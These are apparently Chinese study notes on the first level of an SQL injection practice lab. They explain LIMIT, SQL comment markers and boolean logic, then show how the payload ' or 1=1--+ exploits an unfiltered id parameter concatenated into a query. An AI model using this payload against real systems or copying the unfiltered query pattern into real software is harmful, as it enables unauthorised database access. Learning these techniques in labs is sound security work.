Less-01 用’1‘进行包裹

一、理解句子意义

SELECT * FROM users WHERE id=’1’ LIMIT 0,1;

limit0,1；

第一位代表从第几个开始，第二位代表的是显示多少位数据。

其中0代表从第1个开始，1代表的是显示1位数据。

SELECT * FROM users WHERE id=’1**’or 1=1–** ‘ LIMIT 0,1

从users中选择所有的数据使用where来定位id=1

注释符： –+ 或者 –空格 或者 # （注释后表示后面的句子不再执行）

A and B 两个必须都正确才是true

A or B 两个中有一个正确就是true

or1=1代表这句话永远正确，无论前面的句子如何写，只要进行闭合，句子永远正确。

三、在1后面添加’

多了一个‘

Sql 语句为$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;
Id 参数在拼接 sql 语句时，未对 id 进行任何的过滤等操作，所以当提交 ‘or 1=1–+，直接构
造的 sql 语句就是
SELECT * FROM users WHERE id=’1’or 1=1–+ LIMIT 0,1
这条语句因 or 1=1 所以为永恒真。
